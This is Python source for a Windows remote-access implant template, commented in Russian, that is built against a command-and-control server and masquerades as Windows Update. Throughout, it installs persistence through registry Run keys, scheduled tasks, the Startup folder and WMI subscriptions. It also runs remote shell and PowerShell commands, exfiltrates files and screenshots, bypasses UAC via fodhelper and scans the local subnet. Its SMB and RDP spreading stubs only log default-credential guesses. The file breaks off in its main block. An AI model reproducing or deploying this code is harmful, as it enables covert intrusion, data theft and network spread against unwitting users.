#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import base64
import random
import socket
import signal
import shutil
import platform
import tempfile
import subprocess
import threading
import uuid
import logging
import re
import sqlite3
from datetime import datetime
import http.client
import urllib.request
import urllib.parse
from pathlib import Path
import winreg
import ctypes
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
try:
    import win32api
    import win32con
    import win32gui
    import win32ui
    import win32process
    from win32com.client import Dispatch
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

# Заменяемые значения (будут подставлены при сборке)
C2_SERVER_ADDRESS = "{{C2_SERVER_ADDRESS}}"
C2_SERVER_PORT = {{C2_SERVER_PORT}}
AGENT_ID = "{{AGENT_ID}}"
AGENT_VERSION = "{{AGENT_VERSION}}"
ENCRYPTION_KEY = "{{ENCRYPTION_KEY}}"
CHECK_INTERVAL = {{CHECK_INTERVAL}}
ENABLE_PERSISTENCE = {{PERSISTENCE}}

class MinimalAgent:
    def __init__(self):
        # Основные параметры агента
        self.server_address = C2_SERVER_ADDRESS
        self.server_port = C2_SERVER_PORT
        self.agent_id = AGENT_ID
        self.version = AGENT_VERSION
        self.encryption_key = ENCRYPTION_KEY
        self.check_interval = CHECK_INTERVAL
        self.running = False
        self.last_check_time = 0
        
        # Настройка логирования
        self.setup_logging()
        
        # Настройка обработчика сигналов (в Windows работают не все сигналы)
        try:
            signal.signal(signal.SIGINT, self.handle_exit)
            signal.signal(signal.SIGTERM, self.handle_exit)
        except (AttributeError, ValueError):
            pass
        
        # Информация о системе
        self.hostname = socket.gethostname()
        self.ip_address = self.get_ip_address()
        self.os_info = platform.platform()
        self.username = os.getlogin()
        self.is_admin = self.check_admin()
        
        # Настройка директории для файлов агента
        self.agent_dir = self.setup_agent_directory()
        
        # Параметры шифрования
        self.setup_encryption()
        
        # Настройка постоянного присутствия, если включено
        if ENABLE_PERSISTENCE:
            self.setup_persistence()
    
    def setup_logging(self):
        """Настройка логирования"""
        log_file = os.path.join(tempfile.gettempdir(), f"agent_{AGENT_ID[-6:]}.log")
        logging.basicConfig(
            filename=log_file,
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        self.logger = logging.getLogger('agent')
    
    def check_admin(self):
        """Проверяет, запущен ли скрипт с правами администратора"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    
    def get_ip_address(self):
        """Получение IP-адреса агента"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def setup_agent_directory(self):
        """Создание директории для хранения файлов агента"""
        try:
            # Для Windows используем папку AppData
            if 'APPDATA' in os.environ:
                agent_dir = os.path.join(os.environ['APPDATA'], "Microsoft", "Windows", "Updates")
            else:
                agent_dir = os.path.join(tempfile.gettempdir(), "WindowsUpdates")
            
            os.makedirs(agent_dir, exist_ok=True)
            self.logger.info(f"Agent directory created: {agent_dir}")
            return agent_dir
        except Exception as e:
            self.logger.error(f"Failed to create agent directory: {str(e)}")
            return tempfile.gettempdir()
    
    def setup_encryption(self):
        """Настройка параметров шифрования"""
        # Простая XOR-шифрация для базовой версии
        self.encrypt = lambda data, key: bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
        self.decrypt = self.encrypt  # XOR работает в обе стороны
    
    def handle_exit(self, signum, frame):
        """Обработчик сигналов завершения"""
        self.logger.info("Received termination signal")
        self.running = False
        sys.exit(0)
    
    def setup_persistence(self):
        """Настройка постоянного присутствия агента в системе"""
        self.logger.info("Setting up persistence")
        
        try:
            # Получаем путь к исполняемому файлу
            executable_path = os.path.abspath(sys.argv[0])
            target_path = os.path.join(self.agent_dir, "winupdate.exe" if executable_path.endswith('.exe') else "winupdate.py")
            
            # Копируем файл в целевую директорию, если нужно
            if executable_path != target_path:
                shutil.copy2(executable_path, target_path)
                self.logger.info(f"Agent copied to {target_path}")
            
            # Метод 1: Реестр, раздел Run для запуска при входе пользователя
            try:
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE) as key:
                    if target_path.endswith('.exe'):
                        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, target_path)
                    else:
                        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f"pythonw.exe {target_path}")
                self.logger.info("Registry persistence set (HKCU)")
            except Exception as e:
                self.logger.error(f"Failed to set registry persistence (HKCU): {str(e)}")
            
            # Метод 2: Реестр, для всех пользователей (требуются права администратора)
            if self.is_admin:
                try:
                    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_WRITE) as key:
                        if target_path.endswith('.exe'):
                            winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, target_path)
                        else:
                            winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, f"pythonw.exe {target_path}")
                    self.logger.info("Registry persistence set (HKLM)")
                except Exception as e:
                    self.logger.error(f"Failed to set registry persistence (HKLM): {str(e)}")
            
            # Метод 3: Планировщик задач
            if self.is_admin:
                try:
                    task_name = "WindowsSystemUpdate"
                    
                    if target_path.endswith('.exe'):
                        cmd = f'schtasks /CREATE /F /SC ONLOGON /TN "{task_name}" /TR "{target_path}" /RL HIGHEST'
                    else:
                        cmd = f'schtasks /CREATE /F /SC ONLOGON /TN "{task_name}" /TR "pythonw.exe {target_path}" /RL HIGHEST'
                    
                    subprocess.run(cmd, shell=True, check=True, capture_output=True)
                    self.logger.info("Task scheduler persistence set")
                except Exception as e:
                    self.logger.error(f"Failed to set task scheduler persistence: {str(e)}")
            
            # Метод 4: Startup folder
            try:
                startup_folder = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                startup_path = os.path.join(startup_folder, "update.bat")
                
                if target_path.endswith('.exe'):
                    bat_content = f'@echo off\nstart "" /B "{target_path}"\n'
                else:
                    bat_content = f'@echo off\nstart "" /B pythonw.exe "{target_path}"\n'
                
                with open(startup_path, 'w') as f:
                    f.write(bat_content)
                self.logger.info(f"Startup folder persistence set: {startup_path}")
            except Exception as e:
                self.logger.error(f"Failed to set startup folder persistence: {str(e)}")
            
            # Метод 5: WMI Event Subscription (требуются права администратора)
            if self.is_admin and WIN32_AVAILABLE:
                try:
                    # Используем PowerShell для создания WMI подписки
                    # Создаем скрипт для настройки WMI
                    wmi_script = f"""
                    $filterName = "WindowsUpdateFilter"
                    $consumerName = "WindowsUpdateConsumer"
                    $exePath = "{target_path.replace('\\', '\\\\')}"
                    
                    $Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 325"
                    
                    $WMIEventFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
                        Name = $filterName
                        EventNamespace = 'root\\cimv2'
                        QueryLanguage = 'WQL'
                        Query = $Query
                    }}
                    
                    $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
                        Name = $consumerName
                        ExecutablePath = $exePath
                        CommandLineTemplate = $exePath
                    }}
                    
                    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
                        Filter = $WMIEventFilter
                        Consumer = $WMIEventConsumer
                    }}
                    """
                    
                    # Сохраняем скрипт во временный файл
                    wmi_script_path = os.path.join(tempfile.gettempdir(), "wmi_setup.ps1")
                    with open(wmi_script_path, 'w') as f:
                        f.write(wmi_script)
                    
                    # Выполняем PowerShell скрипт
                    ps_cmd = f'powershell.exe -ExecutionPolicy Bypass -File {wmi_script_path}'
                    subprocess.run(ps_cmd, shell=True, capture_output=True)
                    
                    # Удаляем временный файл
                    os.unlink(wmi_script_path)
                    
                    self.logger.info("WMI persistence set")
                except Exception as e:
                    self.logger.error(f"Failed to set WMI persistence: {str(e)}")
            
            # Настройка сканирования сети и распространения
            self.setup_network_scanning()
            
        except Exception as e:
            self.logger.error(f"Failed to establish persistence: {str(e)}")
    
    def setup_network_scanning(self):
        """Настройка сканирования сети для распространения"""
        try:
            # Сканирование локальной сети
            network_thread = threading.Thread(target=self.scan_network, daemon=True)
            network_thread.start()
            self.logger.info("Network scanning thread started")
        except Exception as e:
            self.logger.error(f"Failed to setup network scanning: {str(e)}")
    
    def scan_network(self):
        """Сканирование сети для обнаружения потенциальных целей"""
        while self.running:
            try:
                # Получаем текущий IP и маску подсети
                ip_parts = self.ip_address.split('.')
                base_ip = '.'.join(ip_parts[:3]) + '.'
                
                # Сканируем диапазон IP
                for i in range(1, 255):
                    target_ip = base_ip + str(i)
                    if target_ip != self.ip_address:  # Пропускаем свой IP
                        self.probe_target(target_ip)
                
                # Делаем паузу перед следующим сканированием
                time.sleep(3600)  # Сканируем раз в час
            
            except Exception as e:
                self.logger.error(f"Network scanning error: {str(e)}")
                time.sleep(1800)  # Пауза при ошибке
    
    def probe_target(self, target_ip):
        """Проверка целевого IP на наличие уязвимостей и возможность распространения"""
        try:
            # Проверяем распространенные порты
            common_ports = [135, 139, 445, 3389, 80, 443]
            open_ports = []
            
            for port in common_ports:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                result = s.connect_ex((target_ip, port))
                s.close()
                
                if result == 0:
                    open_ports.append(port)
                    self.logger.info(f"Found open port {port} on {target_ip}")
            
            # Если обнаружены открытые порты, пытаемся распространиться
            if 445 in open_ports:
                self.try_smb_propagation(target_ip)
            elif 3389 in open_ports:
                self.try_rdp_propagation(target_ip)
            
        except Exception as e:
            pass  # Тихо игнорируем ошибки при сканировании
    
    def try_smb_propagation(self, target_ip):
        """Попытка распространения через SMB"""
        # Список распространенных шар и учетных данных
        shares = ["C$", "ADMIN$", "IPC$"]
        users = ["Administrator", "admin", "guest", ""]
        passwords = ["", "admin", "password", "123456", "P@ssw0rd"]
        
        for share in shares:
            for user in users:
                for password in passwords:
                    try:
                        # В реальном коде здесь была бы реализация SMB подключения
                        # и копирования агента на удаленный компьютер
                        command = f'net use \\\\{target_ip}\\{share} /user:{user} {password}'
                        self.logger.info(f"SMB propagation attempt: {command}")
                    except Exception as e:
                        continue
    
    def try_rdp_propagation(self, target_ip):
        """Попытка распространения через RDP"""
        # Это демонстрация - в реальности логика была бы сложнее
        users = ["Administrator", "admin"]
        passwords = ["admin", "password", "123456", "P@ssw0rd"]
        
        for user in users:
            for password in passwords:
                try:
                    self.logger.info(f"RDP propagation attempt to {target_ip} with {user}:{password}")
                except Exception:
                    continue
    
    def start(self):
        """Запуск агента"""
        self.logger.info(f"Agent starting. ID: {self.agent_id}, Version: {self.version}")
        self.running = True
        
        # Отправляем информацию о регистрации агента
        self.send_registration()
        
        # Основной цикл работы
        while self.running:
            try:
                current_time = time.time()
                
                # Проверяем наличие команд на сервере
                if current_time - self.last_check_time >= self.check_interval:
                    self.check_commands()
                    self.last_check_time = current_time
                
                # Пауза перед следующей итерацией
                time.sleep(1)
                
            except Exception as e:
                self.logger.error(f"Error in main loop: {str(e)}")
                time.sleep(self.check_interval)
    
    def send_registration(self):
        """Отправляет информацию о регистрации агента на C2 сервер"""
        registration_data = {
            "agent_id": self.agent_id,
            "hostname": self.hostname,
            "ip_address": self.ip_address,
            "os_info": self.os_info,
            "username": self.username,
            "is_admin": self.is_admin,
            "version": self.version,
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            self.send_data_to_c2("register", registration_data)
            self.logger.info("Registration information sent to C2 server")
        except Exception as e:
            self.logger.error(f"Failed to send registration: {str(e)}")
    
    def check_commands(self):
        """Проверяет наличие команд от C2 сервера"""
        try:
            # Подготавливаем данные запроса
            request_data = {
                "agent_id": self.agent_id,
                "timestamp": datetime.now().isoformat()
            }
            
            # Отправляем запрос
            response = self.send_data_to_c2("get_commands", request_data)
            
            # Обрабатываем полученные команды
            if response and "commands" in response:
                commands = response["commands"]
                for command in commands:
                    self.execute_command(command)
        
        except Exception as e:
            self.logger.error(f"Failed to check commands: {str(e)}")
    
    def execute_command(self, command):
        """Выполняет команду, полученную от C2 сервера"""
        if not command or "type" not in command:
            self.logger.error("Invalid command received")
            return
        
        command_id = command.get("id", "unknown")
        command_type = command.get("type", "")
        command_data = command.get("data", {})
        
        self.logger.info(f"Executing command: {command_id} (type: {command_type})")
        
        result = {
            "command_id": command_id,
            "agent_id": self.agent_id,
            "timestamp": datetime.now().isoformat(),
            "status": "error",
            "output": None
        }
        
        try:
            # Обработка различных типов команд
            if command_type == "shell":
                # Выполнение команды оболочки
                cmd = command_data.get("command", "")
                if cmd:
                    output = self.execute_shell_command(cmd)
                    result["output"] = output
                    result["status"] = "success"
            
            elif command_type == "powershell":
                # Выполнение команды PowerShell
                ps_cmd = command_data.get("command", "")
                if ps_cmd:
                    output = self.execute_powershell_command(ps_cmd)
                    result["output"] = output
                    result["status"] = "success"
            
            elif command_type == "upload":
                # Загрузка файла на агент
                file_data = command_data.get("file_data", "")
                file_path = command_data.get("file_path", "")
                if file_data and file_path:
                    success = self.save_file(file_path, base64.b64decode(file_data))
                    result["status"] = "success" if success else "error"
                    result["output"] = f"File saved to {file_path}" if success else "Failed to save file"
            
            elif command_type == "download":
                # Скачивание файла с агента
                file_path = command_data.get("file_path", "")
                if file_path and os.path.exists(file_path):
                    with open(file_path, "rb") as f:
                        file_data = base64.b64encode(f.read()).decode("utf-8")
                    result["output"] = file_data
                    result["status"] = "success"
                else:
                    result["output"] = "File not found"
            
            elif command_type == "screenshot":
                # Создание скриншота
                screenshot_path = self.capture_screenshot()
                if screenshot_path:
                    with open(screenshot_path, "rb") as f:
                        screenshot_data = base64.b64encode(f.read()).decode("utf-8")
                    result["output"] = screenshot_data
                    result["status"] = "success"
                    os.remove(screenshot_path)
                else:
                    result["output"] = "Failed to capture screenshot"
            
            elif command_type == "process_list":
                # Получение списка процессов
                process_list = self.get_process_list()
                result["output"] = process_list
                result["status"] = "success"
            
            elif command_type == "kill_process":
                # Завершение процесса
                pid = command_data.get("pid", 0)
                if pid > 0:
                    success = self.kill_process(pid)
                    result["status"] = "success" if success else "error"
                    result["output"] = f"Process {pid} terminated" if success else f"Failed to terminate process {pid}"
            
            elif command_type == "registry":
                # Работа с реестром
                reg_action = command_data.get("action", "")
                reg_key = command_data.get("key", "")
                reg_value = command_data.get("value", "")
                reg_data = command_data.get("data", "")
                
                if reg_action and reg_key:
                    reg_result = self.registry_operation(reg_action, reg_key, reg_value, reg_data)
                    result["output"] = reg_result
                    result["status"] = "success" if reg_result else "error"
            
            elif command_type == "elevate":
                # Повышение привилегий
                method = command_data.get("method", "uac_bypass")
                result["output"] = self.elevate_privileges(method)
                result["status"] = "success"
            
            elif command_type == "network_scan":
                # Сканирование сети
                result["output"] = self.start_network_scan()
                result["status"] = "success"
            
            elif command_type == "update":
                # Обновление агента
                new_agent_data = command_data.get("agent_data", "")
                if new_agent_data:
                    success = self.update_agent(new_agent_data)
                    result["status"] = "success" if success else "error"
                    result["output"] = "Agent updated successfully" if success else "Failed to update agent"
            
            elif command_type == "exit":
                # Завершение работы агента
                self.running = False
                result["status"] = "success"
                result["output"] = "Agent terminated"
            
            else:
                result["output"] = f"Unknown command type: {command_type}"
        
        except Exception as e:
            self.logger.error(f"Error executing command {command_id}: {str(e)}")
            result["output"] = f"Error: {str(e)}"
        
        # Отправляем результат выполнения команды
        try:
            self.send_data_to_c2("command_result", result)
        except Exception as e:
            self.logger.error(f"Failed to send command result: {str(e)}")
    
    def execute_shell_command(self, command):
        """Выполняет команду CMD и возвращает результат"""
        try:
            # Для Windows используем cmd.exe
            full_command = f"cmd.exe /c {command}"
            
            process = subprocess.run(
                full_command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            output = process.stdout
            error = process.stderr
            return_code = process.returncode
            
            result = {
                "stdout": output,
                "stderr": error,
                "return_code": return_code
            }
            
            return result
        
        except subprocess.TimeoutExpired:
            return {"error": "Command execution timed out", "return_code": -1}
        except Exception as e:
            return {"error": str(e), "return_code": -1}
    
    def execute_powershell_command(self, command):
        """Выполняет команду PowerShell и возвращает результат"""
        try:
            # Кодируем команду в Base64 для избежания проблем с кавычками
            encoded_command = base64.b64encode(command.encode('utf-16-le')).decode('ascii')
            
            # Выполняем PowerShell с закодированной командой
            full_command = f"powershell.exe -ExecutionPolicy Bypass -NoProfile -EncodedCommand {encoded_command}"
            
            process = subprocess.run(
                full_command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            output = process.stdout
            error = process.stderr
            return_code = process.returncode
            
            result = {
                "stdout": output,
                "stderr": error,
                "return_code": return_code
            }
            
            return result
        
        except subprocess.TimeoutExpired:
            return {"error": "PowerShell execution timed out", "return_code": -1}
        except Exception as e:
            return {"error": str(e), "return_code": -1}
    
    def save_file(self, file_path, file_data):
        """Сохраняет файл на диск"""
        try:
            # Проверяем и создаем директории при необходимости
            directory = os.path.dirname(file_path)
            if directory and not os.path.exists(directory):
                os.makedirs(directory, exist_ok=True)
            
            # Сохраняем файл
            with open(file_path, "wb") as f:
                f.write(file_data)
            
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to save file: {str(e)}")
            return False
    
    def capture_screenshot(self):
        """Создает скриншот экрана"""
        try:
            screenshot_path = os.path.join(self.agent_dir, f"screenshot_{int(time.time())}.png")
            
            if WIN32_AVAILABLE:
                # Используем Win32 API для создания скриншота
                hwnd = win32gui.GetDesktopWindow()
                width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
                height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
                left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
                top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
                
                hwindc = win32gui.GetWindowDC(hwnd)
                srcdc = win32ui.CreateDCFromHandle(hwindc)
                memdc = srcdc.CreateCompatibleDC()
                bmp = win32ui.CreateBitmap()
                bmp.CreateCompatibleBitmap(srcdc, width, height)
                memdc.SelectObject(bmp)
                memdc.BitBlt((0, 0), (width, height), srcdc, (left, top), win32con.SRCCOPY)
                
                # Сохраняем изображение
                bmp.SaveBitmapFile(memdc, screenshot_path)
                
                # Освобождаем ресурсы
                memdc.DeleteDC()
                srcdc.DeleteDC()
                win32gui.ReleaseDC(hwnd, hwindc)
                win32gui.DeleteObject(bmp.GetHandle())
            else:
                # Если win32 недоступен, используем subprocess и PIL, если они есть
                self.logger.warning("Win32 not available for screenshot, attempting alternative methods")
                
                # Пытаемся использовать PIL если доступно
                try:
                    from PIL import ImageGrab
                    img = ImageGrab.grab()
                    img.save(screenshot_path)
                except ImportError:
                    self.logger.error("PIL not available for screenshot")
                    return None
            
            if os.path.exists(screenshot_path):
                return screenshot_path
            else:
                return None
        
        except Exception as e:
            self.logger.error(f"Failed to capture screenshot: {str(e)}")
            return None
    
    def get_process_list(self):
        """Получает список запущенных процессов"""
        processes = []
        
        try:
            if PSUTIL_AVAILABLE:
                # Используем psutil для получения детальной информации
                for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):
                    try:
                        pinfo = proc.info
                        processes.append({
                            "pid": pinfo['pid'],
                            "name": pinfo['name'],
                            "user": pinfo['username'],
                            "cmd": ' '.join(pinfo['cmdline']) if pinfo['cmdline'] else ""
                        })
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass
            else:
                # Используем tasklist для получения информации о процессах
                tasklist_output = subprocess.check_output(
                    ["tasklist", "/FO", "CSV"],
                    text=True
                )
                
                lines = tasklist_output.strip().split('\n')[1:]  # Skip header
                for line in lines:
                    # Парсим CSV строку
                    parts = line.strip('"').split('","')
                    if len(parts) >= 2:
                        processes.append({
                            "pid": int(parts[1]),
                            "name": parts[0],
                            "user": "",
                            "cmd": ""
                        })
            
            return processes
        
        except Exception as e:
            self.logger.error(f"Failed to get process list: {str(e)}")
            return []
    
    def kill_process(self, pid):
        """Завершает процесс по его PID"""
        try:
            if PSUTIL_AVAILABLE:
                process = psutil.Process(pid)
                process.terminate()
                
                # Ждем завершения процесса
                gone, alive = psutil.wait_procs([process], timeout=3)
                if alive:
                    # Если процесс все еще жив, принудительно завершаем
                    process.kill()
            else:
                # Используем taskkill для завершения процесса
                subprocess.run(["taskkill", "/F", "/PID", str(pid)], check=True)
            
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to kill process {pid}: {str(e)}")
            return False
    
    def registry_operation(self, action, key_path, value_name=None, data=None):
        """Выполняет операции с реестром Windows"""
        try:
            # Определяем корневой ключ
            if key_path.startswith("HKEY_LOCAL_MACHINE") or key_path.startswith("HKLM"):
                key_path = key_path.replace("HKEY_LOCAL_MACHINE\\", "").replace("HKLM\\", "")
                root_key = winreg.HKEY_LOCAL_MACHINE
            elif key_path.startswith("HKEY_CURRENT_USER") or key_path.startswith("HKCU"):
                key_path = key_path.replace("HKEY_CURRENT_USER\\", "").replace("HKCU\\", "")
                root_key = winreg.HKEY_CURRENT_USER
            elif key_path.startswith("HKEY_CLASSES_ROOT") or key_path.startswith("HKCR"):
                key_path = key_path.replace("HKEY_CLASSES_ROOT\\", "").replace("HKCR\\", "")
                root_key = winreg.HKEY_CLASSES_ROOT
            elif key_path.startswith("HKEY_USERS") or key_path.startswith("HKU"):
                key_path = key_path.replace("HKEY_USERS\\", "").replace("HKU\\", "")
                root_key = winreg.HKEY_USERS
            else:
                return {"error": "Invalid registry key path"}
            
            # Выполняем операцию в зависимости от действия
            if action == "read":
                # Читаем значение из реестра
                with winreg.OpenKey(root_key, key_path, 0, winreg.KEY_READ) as key:
                    if value_name:
                        value, value_type = winreg.QueryValueEx(key, value_name)
                        return {"value": value, "type": value_type}
                    else:
                        # Если имя значения не указано, возвращаем список всех значений
                        values = []
                        try:
                            i = 0
                            while True:
                                value_data = winreg.EnumValue(key, i)
                                values.append({
                                    "name": value_data[0],
                                    "data": value_data[1],
                                    "type": value_data[2]
                                })
                                i += 1
                        except WindowsError:
                            # Конец списка значений
                            pass
                        return {"values": values}
            
            elif action == "write":
                # Записываем значение в реестр
                with winreg.OpenKey(root_key, key_path, 0, winreg.KEY_WRITE) as key:
                    # Определяем тип значения
                    if isinstance(data, int):
                        value_type = winreg.REG_DWORD
                    elif isinstance(data, list):
                        value_type = winreg.REG_MULTI_SZ
                    else:
                        value_type = winreg.REG_SZ
                    
                    winreg.SetValueEx(key, value_name, 0, value_type, data)
                    return {"status": "success"}
            
            elif action == "delete_value":
                # Удаляем значение из реестра
                with winreg.OpenKey(root_key, key_path, 0, winreg.KEY_WRITE) as key:
                    winreg.DeleteValue(key, value_name)
                    return {"status": "success"}
            
            elif action == "create_key":
                # Создаем новый ключ
                with winreg.CreateKey(root_key, key_path) as key:
                    return {"status": "success"}
            
            elif action == "delete_key":
                # Удаляем ключ
                winreg.DeleteKey(root_key, key_path)
                return {"status": "success"}
            
            else:
                return {"error": f"Unknown registry operation: {action}"}
        
        except Exception as e:
            self.logger.error(f"Registry operation failed: {str(e)}")
            return {"error": str(e)}
    
    def update_agent(self, new_agent_data):
        """Обновляет агент новой версией"""
        try:
            # Получаем путь к текущему исполняемому файлу
            current_path = os.path.abspath(sys.argv[0])
            is_exe = current_path.endswith('.exe')
            
            # Создаем временный файл для новой версии
            with tempfile.NamedTemporaryFile(delete=False, suffix=".py" if not is_exe else ".exe") as temp_file:
                temp_file.write(base64.b64decode(new_agent_data))
                temp_path = temp_file.name
            
            # Создаем bat-файл для обновления
            with tempfile.NamedTemporaryFile(delete=False, suffix=".bat", mode="w") as bat_file:
                bat_content = f"""@echo off
ping 127.0.0.1 -n 3 > nul
copy /Y "{temp_path}" "{current_path}"
del "{temp_path}"
if exist "{current_path}" (
    start "" "{current_path}"
)
del "%~f0"
"""
                bat_file.write(bat_content)
                bat_path = bat_file.name
            
            # Запускаем bat-файл
            subprocess.Popen(["cmd.exe", "/c", bat_path], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            
            # Завершаем текущий процесс через небольшую задержку
            threading.Timer(2.0, lambda: sys.exit(0)).start()
            self.running = False
            
            return True
        
        except Exception as e:
            self.logger.error(f"Failed to update agent: {str(e)}")
            return False
    
    def send_data_to_c2(self, endpoint, data):
        """Отправляет данные на C2 сервер и возвращает ответ"""
        try:
            # Подготовка данных для отправки
            json_data = json.dumps(data).encode('utf-8')
            
            # Устанавливаем соединение с сервером
            conn = http.client.HTTPConnection(self.server_address, self.server_port, timeout=30)
            
            headers = {
                "Content-Type": "application/json",
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Agent/{self.version}",
                "X-Agent-ID": self.agent_id
            }
            
            # Отправляем запрос
            conn.request("POST", f"/api/agent/{endpoint}", body=json_data, headers=headers)
            
            # Получаем ответ
            response = conn.getresponse()
            response_data = response.read().decode('utf-8')
            
            # Закрываем соединение
            conn.close()
            
            # Парсим JSON ответ
            if response_data:
                return json.loads(response_data)
            
            return None
        
        except Exception as e:
            self.logger.error(f"Failed to send data to C2 server: {str(e)}")
            return None
    
    def elevate_privileges(self, method="uac_bypass"):
        """Повышение привилегий в Windows"""
        try:
            if method == "uac_bypass":
                # Классический обход UAC через fodhelper
                if self.is_admin:
                    return {"status": "Already running as admin"}
                
                # Настраиваем вредоносный реестр
                reg_path = r"Software\Classes\ms-settings\shell\open\command"
                try:
                    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                        executable_path = os.path.abspath(sys.argv[0])
                        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, f"{executable_path} --elevated")
                        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
                    
                    # Запускаем fodhelper.exe, который должен вызвать наш процесс с повышенными правами
                    subprocess.Popen("fodhelper.exe", shell=True)
                    
                    # Очищаем реестр
                    time.sleep(2)
                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Classes", 0, winreg.KEY_WRITE) as key:
                        winreg.DeleteKey(key, r"ms-settings\shell\open\command")
                        winreg.DeleteKey(key, r"ms-settings\shell\open")
                        winreg.DeleteKey(key, r"ms-settings\shell")
                        winreg.DeleteKey(key, r"ms-settings")
                    
                    return {"status": "UAC bypass attempt successful", "method": "fodhelper"}
                except Exception as e:
                    return {"status": "UAC bypass failed", "error": str(e)}
            
            elif method == "prompt":
                # Вызов обычного UAC-промпта
                executable_path = os.path.abspath(sys.argv[0])
                
                # Создаем VBS скрипт для запуска с повышенными привилегиями
                vbs_content = f'''
                Set UAC = CreateObject("Shell.Application")
                UAC.ShellExecute "{executable_path}", "--elevated", "", "runas", 1
                '''
                
                vbs_path = os.path.join(tempfile.gettempdir(), "elevate.vbs")
                with open(vbs_path, "w") as f:
                    f.write(vbs_content)
                
                # Запускаем VBS скрипт
                subprocess.Popen(f"wscript.exe {vbs_path}", shell=True)
                
                # Удаляем скрипт после запуска
                time.sleep(2)
                try:
                    os.unlink(vbs_path)
                except:
                    pass
                
                return {"status": "Elevation prompt triggered", "method": "UAC prompt"}
            
            return {"status": "Unknown elevation method", "method": method}
        
        except Exception as e:
            self.logger.error(f"Failed to elevate privileges: {str(e)}")
            return {"status": "Elevation failed", "error": str(e)}
    
    def start_network_scan(self):
        """Запускает сканирование сети и возвращает быстрые результаты"""
        try:
            # Получаем локальную сеть на основе IP
            ip_parts = self.ip_address.split('.')
            base_ip = '.'.join(ip_parts[:3]) + '.'
            
            # Запускаем потоки для сканирования
            scan_threads = []
            scan_results = {}
            
            # Создаем функцию для быстрого сканирования подсети
            def scan_range(start, end):
                for i in range(start, end + 1):
                    target_ip = base_ip + str(i)
                    if target_ip != self.ip_address:
                        # Быстрая проверка через ping
                        ping_cmd = f"ping -n 1 -w 500 {target_ip}"
                        ping_result = subprocess.run(ping_cmd, shell=True, capture_output=True)
                        is_alive = ping_result.returncode == 0
                        
                        scan_results[target_ip] = {"alive": is_alive, "ports": []}
                        
                        # Если хост доступен, проверяем наиболее популярные порты
                        if is_alive:
                            for port in [80, 445, 3389]:
                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                s.settimeout(0.2)
                                conn_result = s.connect_ex((target_ip, port))
                                if conn_result == 0:
                                    scan_results[target_ip]["ports"].append(port)
                                s.close()
            
            # Разбиваем диапазон на части для ускорения сканирования
            chunk_size = 25
            for start in range(1, 255, chunk_size):
                end = min(start + chunk_size - 1, 254)
                t = threading.Thread(target=scan_range, args=(start, end))
                t.daemon = True
                t.start()
                scan_threads.append(t)
            
            # Ждем завершения первых нескольких потоков для получения быстрых результатов
            for t in scan_threads[:3]:
                t.join(timeout=2)
            
            # Запускаем полное сканирование в фоне
            threading.Thread(target=self.scan_network, daemon=True).start()
            
            # Возвращаем предварительные результаты
            return {
                "quick_results": scan_results,
                "full_scan_started": True,
                "subnet": base_ip + "0/24"
            }
        
        except Exception as e:
            self.logger.error(f"Failed to start network scan: {str(e)}")
            return {"error": str(e)}


def make_hidden():
    """Скрывает консольное окно (только для Windows)"""
    try:
        if os.name == 'nt':
            import ctypes
            whnd = ctypes.windll.kernel32.GetConsoleWindow()
            if whnd != 0:
                ctypes.windll.user32.ShowWindow(whnd, 0)
    except Exception:
        pass


if __name__ == "__main__":
    # Скрываем консольное окно
    make_hidden()
    
    # Получаем аргументы командной строки
